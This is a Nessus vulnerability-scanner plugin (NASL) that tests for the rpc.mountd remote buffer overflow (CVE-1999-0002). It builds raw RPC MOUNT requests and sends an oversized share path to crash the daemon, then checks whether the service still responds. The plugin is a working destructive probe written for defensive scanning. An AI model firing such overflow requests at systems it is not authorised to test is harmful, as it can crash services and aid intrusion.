#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11337);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CVE-1999-0002");
 script_bugtraq_id(121);
 script_xref(name:"OSVDB", value:"909");
 script_xref(name:"CERT", value:"CA-1998-12");
 
 script_name(english:"Multiple Linux rpc.mountd Remote Overflow");
 script_summary(english:"Overflows mountd");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote service has a buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote mount daemon seems to have a buffer overflow\n",
     "vulnerability.  A remote attacker could exploit this to\n",
     "execute arbitrary code as root."
   )
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Consult your vendor for patch or upgrade information."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");

 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");

 script_dependencie("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}



include("misc_func.inc");
include("nfs_func.inc");


function naughty_mount(soc, share)
{
  local_var pad, req, len, r, ret, i;
  
  pad = padsz(len:strlen(this_host_name()));
  len = 52 + strlen(this_host_name()) + pad;
  
  req = 	   rpclong(val:rand()) +
  		   rpclong(val:0) +
		   rpclong(val:2) +
		   rpclong(val:100005) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:len) +
		   rpclong(val:rand()) +
		   rpclong(val:strlen(this_host_name())) +
		   this_host_name() +
		   rpcpad(pad:pad) +
		   rpclong(val:0)  +	
		   rpclong(val:0)  +	
		   rpclong(val:7)  +	
		   rpclong(val:0)  +	
		   rpclong(val:2)  + 	
		   rpclong(val:3)  +	
		   rpclong(val:4)  +
		   rpclong(val:5)  +
		   rpclong(val:20) +
		   rpclong(val:31) +
		   rpclong(val:0)  +	
		   rpclong(val:0)  +
		   rpclong(val:0)  +
					
		   rpclong(val:strlen(share)) +
		   share +
		   rpcpad(pad:padsz(len:strlen(share)));
		   
  send(socket:soc, data:req);
  r = recv(socket:soc, length:4096);
  if(!r) return 0;
  else return 1;
}

port = get_rpc_port(program:100005, protocol:IPPROTO_UDP);
if ( ! port ) exit(0);
soc = open_priv_sock_udp(dport:port);


if(!soc)exit(0);

if(naughty_mount(soc:soc, share:"/nessus") != 0)
{
 naughty_mount(soc:soc, share:"/" + crap(4096));
 sleep(1);
 if(naughty_mount(soc:soc, share:"/nessus") == 0)
  security_hole(port);
}
